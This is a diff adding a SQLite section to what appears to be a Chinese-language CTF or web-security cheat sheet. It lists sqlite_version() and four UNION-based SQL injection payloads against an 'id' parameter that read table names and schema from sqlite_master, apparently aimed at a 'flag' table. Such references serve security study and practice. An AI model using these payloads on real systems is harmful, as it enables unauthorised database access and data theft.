@@ -898,6 +898,27 @@ $IFS$9
 # SQL Injection
 ## sqlite语法
 
+常用函数
+
+| 函数名           | 作用 |
+| ---------------- | ---- |
+| sqlite_version() | 查询sqlite版本     |
+
+查询当前表名
+`index.php?id=1 union select 1,name,3,4 from sqlite_master where type='table' limit 0,1`
+
+查询列名
+`index.php?id=1 union select 1,sql,3,4 from sqlite_master where type='table' and name='flag'`
+
+查询所有表名
+`?id=2) union select name,2,3 from sqlite_master where type='table' limit 0,1-- `
+
+查询列名
+`?id=2) union select sql,2,3 from sqlite_master where type='table' and name='flag'-- `
+
+盲注
+
+
 
 ## postgreSQL语法
 
